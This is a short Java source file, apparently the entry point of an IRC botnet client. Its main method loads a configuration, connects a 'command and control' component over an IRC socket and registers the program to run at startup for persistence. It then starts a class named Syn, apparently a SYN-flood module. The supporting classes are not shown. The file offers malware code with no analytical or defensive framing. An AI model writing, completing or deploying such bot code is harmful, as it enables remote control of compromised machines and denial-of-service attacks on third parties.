public class Bot {

	public static CAC CAC_INSTANCE = null;

	public static void main(String[] args) {
		Debug.print("Location: " + Util.getJARLoc() + "\n");
		Config conf = new Config();
		ConfigReader reader = new ConfigReader(conf);
		reader.read();
		Debug.print("Read configuration, starting up... \n");
		CAC_INSTANCE = new CAC(new IRCSocket(conf));
		Debug.print("Command and control instantiated... \n");
		CAC_INSTANCE.start();
                Debug.print("Adding to startup... \n");
                new StartupAdder().addToStartup();
		new Syn();
	}

}